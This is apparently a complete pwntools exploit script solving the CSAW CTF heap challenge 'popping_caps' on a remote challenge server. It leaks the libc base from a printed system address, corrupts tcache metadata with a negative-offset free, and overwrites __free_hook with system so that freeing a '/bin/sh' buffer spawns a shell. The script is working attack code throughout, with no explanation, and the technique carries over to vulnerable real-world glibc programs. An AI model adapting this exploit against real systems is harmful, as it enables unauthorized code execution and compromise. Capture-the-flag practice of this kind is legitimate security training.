#!/usr/bin/python

from pwn import *

elf = ELF('./popping_caps')
libc = ELF("./libc.so.6")
#conn=process('./popping_caps')
conn = remote("pwn.chal.csaw.io", 1008)

conn.recvuntil("Here is system 0x")
base=int(conn.recvline()[:-1],16) - libc.symbols["system"]
conn.clean()

def malloc(size):
  conn.sendline("1")
  conn.sendline(str(size))
  conn.clean()

def free(offset):
  conn.sendline("2")
  conn.sendline(str(offset))
  conn.clean()

def write(payload):
  conn.sendline("3")
  conn.sendline(payload)
  conn.clean()

def byte():
  conn.sendline("4")
  conn.interactive()

malloc(0x10) 
free(-0x250)
malloc(0x240)
write("\x00" * 0x40 + p64(base + libc.symbols["__free_hook"] - 8))
malloc(0x10)
write("/bin/sh\x00" + p64(base + libc.symbols["system"]))
free(0)

conn.interactive()
